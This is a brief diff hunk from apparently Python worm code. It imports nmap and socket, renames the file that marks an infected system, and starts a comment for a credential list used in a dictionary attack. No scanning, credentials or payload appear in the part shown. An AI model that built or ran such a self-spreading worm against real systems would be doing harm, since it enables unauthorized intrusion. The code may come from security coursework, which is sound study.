@@ -4,7 +4,7 @@ import nmap
 import socket
  
 # File marking the presence of a worm in a system
-INFECTION_MARKER = "/tmp/infectionMarker.txt"
+INFECTION_MARKER = "/tmp/infectionMarker_repW_python.txt"
  
  
 # List of credentials for Dictionary Attack
